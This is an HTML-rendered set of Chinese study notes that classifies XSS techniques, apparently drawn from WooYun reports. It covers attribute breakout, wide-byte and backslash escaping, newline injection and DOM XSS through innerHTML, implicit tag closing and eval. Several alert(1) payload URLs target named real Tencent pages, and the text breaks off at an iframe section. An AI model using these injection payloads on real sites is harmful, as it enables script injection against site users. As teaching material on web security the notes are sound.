<!DOCTYPE html><html><head><meta charset="utf-8"><style>body {
  width: 45em;
  border: 1px solid #ddd;
  outline: 1300px solid #fff;
  margin: 16px auto;
}

body .markdown-body
{
  padding: 30px;
}

@font-face {
  font-family: octicons-anchor;
  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
}

.markdown-body {
  font-family: sans-serif;
  -ms-text-size-adjust: 100%;
  -webkit-text-size-adjust: 100%;
  color: #333333;
  overflow: hidden;
  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
  font-size: 16px;
  line-height: 1.6;
  word-wrap: break-word;
}

.markdown-body a {
  background: transparent;
}

.markdown-body a:active,
.markdown-body a:hover {
  outline: 0;
}

.markdown-body strong {
  font-weight: bold;
}

.markdown-body h1 {
  font-size: 2em;
  margin: 0.67em 0;
}

.markdown-body img {
  border: 0;
}

.markdown-body hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  height: 0;
}

.markdown-body pre {
  overflow: auto;
}

.markdown-body code,
.markdown-body kbd,
.markdown-body pre {
  font-family: monospace, monospace;
  font-size: 1em;
}

.markdown-body input {
  color: inherit;
  font: inherit;
  margin: 0;
}

.markdown-body html input[disabled] {
  cursor: default;
}

.markdown-body input {
  line-height: normal;
}

.markdown-body input[type="checkbox"] {
  box-sizing: border-box;
  padding: 0;
}

.markdown-body table {
  border-collapse: collapse;
  border-spacing: 0;
}

.markdown-body td,
.markdown-body th {
  padding: 0;
}

.markdown-body * {
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

.markdown-body input {
  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
  line-height: 1.4;
}

.markdown-body a {
  color: #4183c4;
  text-decoration: none;
}

.markdown-body a:hover,
.markdown-body a:focus,
.markdown-body a:active {
  text-decoration: underline;
}

.markdown-body hr {
  height: 0;
  margin: 15px 0;
  overflow: hidden;
  background: transparent;
  border: 0;
  border-bottom: 1px solid #ddd;
}

.markdown-body hr:before,
.markdown-body hr:after {
  display: table;
  content: " ";
}

.markdown-body hr:after {
  clear: both;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  margin-top: 15px;
  margin-bottom: 15px;
  line-height: 1.1;
}

.markdown-body h1 {
  font-size: 30px;
}

.markdown-body h2 {
  font-size: 21px;
}

.markdown-body h3 {
  font-size: 16px;
}

.markdown-body h4 {
  font-size: 14px;
}

.markdown-body h5 {
  font-size: 12px;
}

.markdown-body h6 {
  font-size: 11px;
}

.markdown-body blockquote {
  margin: 0;
}

.markdown-body ul,
.markdown-body ol {
  padding: 0;
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body ol ol,
.markdown-body ul ol {
  list-style-type: lower-roman;
}

.markdown-body ul ul ol,
.markdown-body ul ol ol,
.markdown-body ol ul ol,
.markdown-body ol ol ol {
  list-style-type: lower-alpha;
}

.markdown-body dd {
  margin-left: 0;
}

.markdown-body code,
.markdown-body pre {
  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
  font-size: 12px;
}

.markdown-body pre {
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body kbd {
  background-color: #e7e7e7;
  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);
  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
  background-image: linear-gradient(#fefefe, #e7e7e7);
  background-repeat: repeat-x;
  border-radius: 2px;
  border: 1px solid #cfcfcf;
  color: #000;
  padding: 3px 5px;
  line-height: 10px;
  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
  display: inline-block;
}

.markdown-body>*:first-child {
  margin-top: 0 !important;
}

.markdown-body>*:last-child {
  margin-bottom: 0 !important;
}

.markdown-body .anchor {
  position: absolute;
  top: 0;
  bottom: 0;
  left: 0;
  display: block;
  padding-right: 6px;
  padding-left: 30px;
  margin-left: -30px;
}

.markdown-body .anchor:focus {
  outline: none;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  position: relative;
  margin-top: 1em;
  margin-bottom: 16px;
  font-weight: bold;
  line-height: 1.4;
}

.markdown-body h1 .octicon-link,
.markdown-body h2 .octicon-link,
.markdown-body h3 .octicon-link,
.markdown-body h4 .octicon-link,
.markdown-body h5 .octicon-link,
.markdown-body h6 .octicon-link {
  display: none;
  color: #000;
  vertical-align: middle;
}

.markdown-body h1:hover .anchor,
.markdown-body h2:hover .anchor,
.markdown-body h3:hover .anchor,
.markdown-body h4:hover .anchor,
.markdown-body h5:hover .anchor,
.markdown-body h6:hover .anchor {
  height: 1em;
  padding-left: 8px;
  margin-left: -30px;
  line-height: 1;
  text-decoration: none;
}

.markdown-body h1:hover .anchor .octicon-link,
.markdown-body h2:hover .anchor .octicon-link,
.markdown-body h3:hover .anchor .octicon-link,
.markdown-body h4:hover .anchor .octicon-link,
.markdown-body h5:hover .anchor .octicon-link,
.markdown-body h6:hover .anchor .octicon-link {
  display: inline-block;
}

.markdown-body h1 {
  padding-bottom: 0.3em;
  font-size: 2.25em;
  line-height: 1.2;
  border-bottom: 1px solid #eee;
}

.markdown-body h2 {
  padding-bottom: 0.3em;
  font-size: 1.75em;
  line-height: 1.225;
  border-bottom: 1px solid #eee;
}

.markdown-body h3 {
  font-size: 1.5em;
  line-height: 1.43;
}

.markdown-body h4 {
  font-size: 1.25em;
}

.markdown-body h5 {
  font-size: 1em;
}

.markdown-body h6 {
  font-size: 1em;
  color: #777;
}

.markdown-body p,
.markdown-body blockquote,
.markdown-body ul,
.markdown-body ol,
.markdown-body dl,
.markdown-body table,
.markdown-body pre {
  margin-top: 0;
  margin-bottom: 16px;
}

.markdown-body hr {
  height: 4px;
  padding: 0;
  margin: 16px 0;
  background-color: #e7e7e7;
  border: 0 none;
}

.markdown-body ul,
.markdown-body ol {
  padding-left: 2em;
}

.markdown-body ul ul,
.markdown-body ul ol,
.markdown-body ol ol,
.markdown-body ol ul {
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body li>p {
  margin-top: 16px;
}

.markdown-body dl {
  padding: 0;
}

.markdown-body dl dt {
  padding: 0;
  margin-top: 16px;
  font-size: 1em;
  font-style: italic;
  font-weight: bold;
}

.markdown-body dl dd {
  padding: 0 16px;
  margin-bottom: 16px;
}

.markdown-body blockquote {
  padding: 0 15px;
  color: #777;
  border-left: 4px solid #ddd;
}

.markdown-body blockquote>:first-child {
  margin-top: 0;
}

.markdown-body blockquote>:last-child {
  margin-bottom: 0;
}

.markdown-body table {
  display: block;
  width: 100%;
  overflow: auto;
  word-break: normal;
  word-break: keep-all;
}

.markdown-body table th {
  font-weight: bold;
}

.markdown-body table th,
.markdown-body table td {
  padding: 6px 13px;
  border: 1px solid #ddd;
}

.markdown-body table tr {
  background-color: #fff;
  border-top: 1px solid #ccc;
}

.markdown-body table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

.markdown-body img {
  max-width: 100%;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

.markdown-body code {
  padding: 0;
  padding-top: 0.2em;
  padding-bottom: 0.2em;
  margin: 0;
  font-size: 85%;
  background-color: rgba(0,0,0,0.04);
  border-radius: 3px;
}

.markdown-body code:before,
.markdown-body code:after {
  letter-spacing: -0.2em;
  content: "\00a0";
}

.markdown-body pre>code {
  padding: 0;
  margin: 0;
  font-size: 100%;
  word-break: normal;
  white-space: pre;
  background: transparent;
  border: 0;
}

.markdown-body .highlight {
  margin-bottom: 16px;
}

.markdown-body .highlight pre,
.markdown-body pre {
  padding: 16px;
  overflow: auto;
  font-size: 85%;
  line-height: 1.45;
  background-color: #f7f7f7;
  border-radius: 3px;
}

.markdown-body .highlight pre {
  margin-bottom: 0;
  word-break: normal;
}

.markdown-body pre {
  word-wrap: normal;
}

.markdown-body pre code {
  display: inline;
  max-width: initial;
  padding: 0;
  margin: 0;
  overflow: initial;
  line-height: inherit;
  word-wrap: normal;
  background-color: transparent;
  border: 0;
}

.markdown-body pre code:before,
.markdown-body pre code:after {
  content: normal;
}

.markdown-body .highlight {
  background: #ffffff;
}

.markdown-body .highlight .c {
  color: #999988;
  font-style: italic;
}

.markdown-body .highlight .err {
  color: #a61717;
  background-color: #e3d2d2;
}

.markdown-body .highlight .k {
  font-weight: bold;
}

.markdown-body .highlight .o {
  font-weight: bold;
}

.markdown-body .highlight .cm {
  color: #999988;
  font-style: italic;
}

.markdown-body .highlight .cp {
  color: #999999;
  font-weight: bold;
}

.markdown-body .highlight .c1 {
  color: #999988;
  font-style: italic;
}

.markdown-body .highlight .cs {
  color: #999999;
  font-weight: bold;
  font-style: italic;
}

.markdown-body .highlight .gd {
  color: #000000;
  background-color: #ffdddd;
}

.markdown-body .highlight .gd .x {
  color: #000000;
  background-color: #ffaaaa;
}

.markdown-body .highlight .ge {
  font-style: italic;
}

.markdown-body .highlight .gr {
  color: #aa0000;
}

.markdown-body .highlight .gh {
  color: #999999;
}

.markdown-body .highlight .gi {
  color: #000000;
  background-color: #ddffdd;
}

.markdown-body .highlight .gi .x {
  color: #000000;
  background-color: #aaffaa;
}

.markdown-body .highlight .go {
  color: #888888;
}

.markdown-body .highlight .gp {
  color: #555555;
}

.markdown-body .highlight .gs {
  font-weight: bold;
}

.markdown-body .highlight .gu {
  color: #800080;
  font-weight: bold;
}

.markdown-body .highlight .gt {
  color: #aa0000;
}

.markdown-body .highlight .kc {
  font-weight: bold;
}

.markdown-body .highlight .kd {
  font-weight: bold;
}

.markdown-body .highlight .kn {
  font-weight: bold;
}

.markdown-body .highlight .kp {
  font-weight: bold;
}

.markdown-body .highlight .kr {
  font-weight: bold;
}

.markdown-body .highlight .kt {
  color: #445588;
  font-weight: bold;
}

.markdown-body .highlight .m {
  color: #009999;
}

.markdown-body .highlight .s {
  color: #dd1144;
}

.markdown-body .highlight .n {
  color: #333333;
}

.markdown-body .highlight .na {
  color: teal;
}

.markdown-body .highlight .nb {
  color: #0086b3;
}

.markdown-body .highlight .nc {
  color: #445588;
  font-weight: bold;
}

.markdown-body .highlight .no {
  color: teal;
}

.markdown-body .highlight .ni {
  color: purple;
}

.markdown-body .highlight .ne {
  color: #990000;
  font-weight: bold;
}

.markdown-body .highlight .nf {
  color: #990000;
  font-weight: bold;
}

.markdown-body .highlight .nn {
  color: #555555;
}

.markdown-body .highlight .nt {
  color: navy;
}

.markdown-body .highlight .nv {
  color: teal;
}

.markdown-body .highlight .ow {
  font-weight: bold;
}

.markdown-body .highlight .w {
  color: #bbbbbb;
}

.markdown-body .highlight .mf {
  color: #009999;
}

.markdown-body .highlight .mh {
  color: #009999;
}

.markdown-body .highlight .mi {
  color: #009999;
}

.markdown-body .highlight .mo {
  color: #009999;
}

.markdown-body .highlight .sb {
  color: #dd1144;
}

.markdown-body .highlight .sc {
  color: #dd1144;
}

.markdown-body .highlight .sd {
  color: #dd1144;
}

.markdown-body .highlight .s2 {
  color: #dd1144;
}

.markdown-body .highlight .se {
  color: #dd1144;
}

.markdown-body .highlight .sh {
  color: #dd1144;
}

.markdown-body .highlight .si {
  color: #dd1144;
}

.markdown-body .highlight .sx {
  color: #dd1144;
}

.markdown-body .highlight .sr {
  color: #009926;
}

.markdown-body .highlight .s1 {
  color: #dd1144;
}

.markdown-body .highlight .ss {
  color: #990073;
}

.markdown-body .highlight .bp {
  color: #999999;
}

.markdown-body .highlight .vc {
  color: teal;
}

.markdown-body .highlight .vg {
  color: teal;
}

.markdown-body .highlight .vi {
  color: teal;
}

.markdown-body .highlight .il {
  color: #009999;
}

.markdown-body .highlight .gc {
  color: #999;
  background-color: #EAF2F5;
}

.markdown-body .octicon {
  font: normal normal 16px octicons-anchor;
  line-height: 1;
  display: inline-block;
  text-decoration: none;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.markdown-body .octicon-link:before {
  content: '\f05c';
}

.markdown-body .task-list-item {
  list-style-type: none;
}

.markdown-body .task-list-item+.task-list-item {
  margin-top: 3px;
}

.markdown-body .task-list-item input {
  margin: 0 4px 0.25em -20px;
  vertical-align: middle;
}
</style><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
MathJax.Hub.Config({
  config: ["MMLorHTML.js"],
  extensions: ["tex2jax.js"],
  jax: ["input/TeX"],
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"] ],
    displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
    processEscapes: false
  },
  TeX: {
    extensions: ["AMSmath.js", "AMSsymbols.js"],
    TagSide: "right",
    TagIndent: ".8em",
    MultLineWidth: "85%",
    equationNumbers: {
      autoNumber: "AMS",
    },
    unicode: {
      fonts: "STIXGeneral,'Arial Unicode MS'"
    }
  },
  showProcessingMessages: false
});
</script>
<title>XSSClassification</title></head><body><article class="markdown-body"><h1>
<a name="user-content-xss-%E5%88%86%E7%B1%BB" class="anchor" href="#xss-%E5%88%86%E7%B1%BB" aria-hidden="true"><span class="octicon octicon-link"></span></a>XSS 分类</h1>

<h4>
<a name="user-content-%E6%95%B4%E7%90%86%E8%87%AA%E4%B9%8C%E4%BA%91" class="anchor" href="#%E6%95%B4%E7%90%86%E8%87%AA%E4%B9%8C%E4%BA%91" aria-hidden="true"><span class="octicon octicon-link"></span></a>整理自乌云</h4>

<ul>
<li>什么都没过滤的情况</li>
<li>
<p>输出在<code>&lt;script&gt;&lt;script/&gt;</code>之间的</p>

<p><code>new Image().src="..."</code> 或者 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
</li>
<li>
<p>输出在html里的</p>

<p><code>http://xxx.com/search?word=hehe</code></p>

<div class="highlight highlight-html"><pre><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"hehe"</span><span class="nt">&gt;</span>
</pre></div>

<p>修改为 <code>http://xxx.com/search?word=hehe" onclick="alert(1)</code></p>

<p>则变成</p>

<div class="highlight highlight-html"><pre><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"hehe"</span> <span class="na">onclick=</span><span class="s">"alert(1)"</span><span class="nt">&gt;</span>
</pre></div>
</li>
<li>
<p>宽字节注入</p>

<p>URL 编码简介</p>

<table>
<thead>
<tr>
<th>sp</th>
<th>"</th>
<th>'</th>
<th>,</th>
<th>;</th>
<th>&lt;</th>
<th>&gt;</th>
<th>?</th>
<th>[</th>
</tr>
</thead>
<tbody>
<tr>
<td>%20</td>
<td>%22</td>
<td>%27</td>
<td>%2C</td>
<td>%3B</td>
<td>%3C</td>
<td>%3E</td>
<td>%3F</td>
<td>%5B</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr>
<th>]</th>
<th>{</th>
<th>o</th>
<th>}</th>
</tr>
</thead>
<tbody>
<tr>
<td>%5D</td>
<td>%7B</td>
<td>%7C</td>
<td>%7D</td>
</tr>
</tbody>
</table>

<table>
<thead>
<tr>
<th>newline</th>
<th>[</th>
<th>]</th>
<th>|</th>
</tr>
</thead>
<tbody>
<tr>
<td>space</td>
<td>&amp;#91;</td>
<td>&amp;#93;</td>
<td>&amp;#124;</td>
</tr>
</tbody>
</table>

<p><code>http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%22;alert(1);//aaaaaa</code>
中 <code>%22</code> 代表 <code>"</code>, 但是最后被过滤为 <code>&amp;quot;</code>：</p>

<div class="highlight highlight-js"><pre><span class="kd">var</span> <span class="nx">gsTest</span> <span class="o">=</span> <span class="s2">"&amp;quot;;alert(1);//aaaaaa"</span><span class="p">;</span>
</pre></div>

<p>预想效果:</p>

<div class="highlight highlight-js"><pre><span class="kd">var</span> <span class="nx">gsTest</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//aaaaaa";</span>
</pre></div>

<p>当html为gbxxxx系列编码时，改为如下:</p>

<p><code>http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa</code></p>

<p>效果： </p>

<div class="highlight highlight-js"><pre><span class="kd">var</span> <span class="nx">gsTest</span><span class="o">=</span> <span class="s2">"宽"</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//aaaaaa</span>
</pre></div>

<p>我试了在console里试了<code>decodeURI('%C0%5C')</code>等各种组合还是不明白真相...</p>

<p>作者解释：至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。
并不是因为%22变成了 %5c%22,而 %c0吃掉了后面的%5c （怎么吃的啊T^T）</p>
</li>
<li>
<p>反斜杠</p>

<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa"</span><span class="o">+</span><span class="s2">"&amp;from=bbb"</span><span class="o">+</span><span class="s2">"&amp;param="</span><span class="p">;</span><span class="c1">//comment</span>
</pre></div>

<p>可以用反斜杠 <code>\</code> 杀死 <code>"</code>，改成</p>

<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa\"+"</span><span class="o">&amp;</span><span class="nx">from</span><span class="o">=</span><span class="mi">1</span><span class="c1">//"+"&amp;param=";</span>
</pre></div>

<p>问题： "字符串"&amp;from=1，这样是错误的，因为&amp;符号的优先级高， ("字符串"&amp;from)=1 是无法进行这种赋值操作，继续修改 </p>

<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa\"+"</span><span class="o">&amp;</span><span class="nx">from</span><span class="o">==</span><span class="mi">1</span><span class="c1">//"+"&amp;param=";</span>
</pre></div>

<p>问题： from未定义，加一个函数定义（js会先解析定义），继续修改</p>

<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa\"+"</span><span class="o">&amp;</span><span class="nx">from</span><span class="o">==</span><span class="mi">1</span><span class="p">;</span><span class="kd">function</span> <span class="nx">from</span><span class="p">(){}</span><span class="c1">//"+"&amp;param=";</span>
</pre></div>

<p>问题： 空格被转义为了 <code>&amp;nbsp;</code>， /**/替换空格，继续修改 </p>

<div class="highlight highlight-js"><pre><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"........."</span><span class="o">+</span><span class="s2">"&amp;ss=aaaa\"+"</span><span class="o">&amp;</span><span class="nx">from</span><span class="o">==</span><span class="mi">1</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="kd">function</span><span class="cm">/**/</span><span class="nx">from</span><span class="p">(){}</span><span class="c1">//"+"&amp;param=";</span>
</pre></div>
</li>
<li>
<p>换行符</p>

<p><code>%0a</code> 代表html中的换行，达到如下效果：</p>

<div class="highlight highlight-js"><pre><span class="c1">//我是注释，我爱洗澡，哦～哦～哦～ [我是输出]</span>
</pre></div>

<p>变成</p>

<div class="highlight highlight-js"><pre><span class="c1">//我是注释，我爱洗澡，哦～哦～哦～ [我是输出  换行符</span>
<span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//我是输出]</span>
</pre></div>
</li>
<li>
<p>DOM XSS 显示输出</p>

<div class="highlight highlight-js"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'test'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">"&lt;img src=1&gt;"</span><span class="p">;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">'....'</span><span class="p">);</span>
<span class="nx">$</span><span class="p">(</span><span class="s1">'.class-name'</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">'...'</span><span class="p">);</span>
</pre></div>

<p><code>innerHTML = &lt;script&gt;alert(1)&lt;/script&gt;</code>无法触发，只能用<code>&lt;img&gt;</code>
JS的字符串中的字符可以写为 unicode编码。
如： <code>&lt;</code> 可以表示为 <code>\u003c</code> , <code>&gt;</code> 可以表示为 <code>\u003e</code></p>

<div class="highlight highlight-js"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"a"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s2">"\u003cimg src=1\u003e"</span><span class="p">;</span>
</pre></div>

<p>在JS字符串里， &lt; 不光可以写为 \u003c，还可以写为 \x3c， &gt; 同样可以写为 \x3e, 是16进制编码</p>
</li>
<li>
<p>DOM XSS 隐式输出</p>

<div class="highlight highlight-html"><pre><span class="nt">&lt;object&gt;&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"aaaaa"</span><span class="nt">&gt;</span>
</pre></div>

<p><code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa"&gt;&lt;/object&gt;&lt;img src="1" onerror="alert(1)</code></p>

<p>通过隐式闭合标签进行注入，插入诸如<code>&lt;img&gt;</code>标签</p>

<div class="highlight highlight-html"><pre><span class="nt">&lt;object&gt;&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"aaaaa"</span><span class="nt">&gt;&lt;/object&gt;&lt;img</span> <span class="na">src=</span><span class="s">"1"</span> <span class="na">onerror=</span><span class="s">"alert(1)"</span><span class="nt">&gt;</span>
</pre></div>

<p>由于chrome已经过滤了<code>&lt; &gt;</code>两个符号，所以js代码过滤的是encode后的字符，相当于没过滤
<code>decodeURIComponent</code> 的操作，会将 <code>%3c</code>, <code>%3e</code>，又变回 <code>&lt;</code>, <code>&gt;</code></p>

<p>也可以构造URL如 <code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa%22%3E%3C/object%3E%3Cimg%20src=1%20onerror=alert(1)%3E</code> 以达到目的</p>
</li>
<li>
<p>DOM XSS eval函数</p>

<p>先看这个url: <code>http://kf.qq.com/search_app.shtml?key=aaaaa</code>
通过在url后面加非法字符 <code>\</code> 构造 <code>http://http://kf.qq.com/search_app.shtml?key=aaaaa\</code>
然后从控制台定位到错误代码，发现下面这段js</p>

<div class="highlight highlight-js"><pre><span class="kd">var</span> <span class="nx">getarg</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">allargs</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"?"</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// 获得key=aaaa</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">allargs</span><span class="o">!=</span><span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">allargs</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">"="</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">args</span> <span class="o">=</span> <span class="nx">allargs</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"&amp;"</span><span class="p">);</span> <span class="c1">// 多arguments情况</span>
        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">arg</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s2">"="</span><span class="p">);</span>
            <span class="nb">eval</span><span class="p">(</span><span class="s1">'this.'</span><span class="o">+</span><span class="nx">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s1">'="'</span><span class="o">+</span><span class="nx">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s1">'";'</span><span class="p">);</span> <span class="c1">// 直接用了this调用key</span>
            <span class="c1">// 然后可以在页面里执行</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></div>

<p>通过加分号断句，让自己的xss执行，那么可以把<code>this.key="aaaaa";</code> 变成 <code>this.key;alert(1);//="asdas"</code>
让 <code>arg[0]</code> 变成 <code>key;alert(1);//</code>，把后面的用注释断句
构造url: <code>http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaaa</code></p>

<p>chrome中 <code>"</code> 会变成 <code>%22</code> 而失效</p>
</li>
<li>
<p>DOM XSS iframe</p>

<p>有时候，输出还会出现在  。
iframe 的 src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，
而且可以用不同的姿势来执行。这一类问题，我将其归为[路径可控]问题。
当然上面说到的是普通的反射型XSS。有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src="[可控的url]"; 同样会导致XSS问题</p>

<ul>
<li>onload执行js</li>
</ul>

